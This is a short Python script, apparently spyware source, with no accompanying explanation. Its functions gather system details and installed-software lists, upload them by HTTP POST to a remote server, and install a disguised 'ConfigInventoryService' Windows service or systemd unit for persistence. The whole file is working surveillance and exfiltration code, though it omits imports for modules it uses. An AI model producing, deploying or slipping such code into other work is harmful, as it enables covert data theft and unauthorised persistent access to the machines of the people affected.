import json

def collect_system_info():
    system_info = {
        "platform": platform.platform(),
        "architecture": platform.architecture(),
        "processor": platform.processor(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "node": platform.node(),
        "installed_software": []
    }
    
    if platform.system() == "Windows":
        installed_software = subprocess.check_output(['wmic', 'product', 'get', 'name']).decode().strip().split('\n')
        system_info["installed_software"] = [s.strip() for s in installed_software[1:] if s.strip()]
    elif platform.system() == "Linux":
        installed_software = subprocess.check_output(['dpkg', '-l']).decode().strip().split('\n')
        system_info["installed_software"] = [s.split()[1] for s in installed_software[5:] if s]
    
    return system_info

def save_to_file(system_info, output_file):
    with open(output_file, 'w') as f:
        json.dump(system_info, f, indent=4)

def upload_to_server(output_file, remote_server):
    with open(output_file, 'rb') as f:
        files = {'file': (output_file, f)}
        response = requests.post(remote_server, files=files)
        return response.status_code

def create_persistence_service():
    if platform.system() == "Windows":
        subprocess.run(['sc', 'create', 'ConfigInventoryService', 'binPath=', 'C:\\path\\to\\your\\script.exe'])
    elif platform.system() == "Linux":
        with open('/etc/systemd/system/configinventory.service', 'w') as f:
            f.write('[Unit]\nDescription=Config Inventory Service\n\n[Service]\nExecStart=/usr/bin/your_script.sh\n\n[Install]\nWantedBy=multi-user.target\n')
        subprocess.run(['systemctl', 'enable', 'configinventory'])

def spyware_system_config_inventory(output_file: str, remote_server: str) -> None:
    system_info = collect_system_info()
    save_to_file(system_info, output_file)
    upload_status = upload_to_server(output_file, remote_server)
    print(f"Upload status: {upload_status}")
    create_persistence_service()
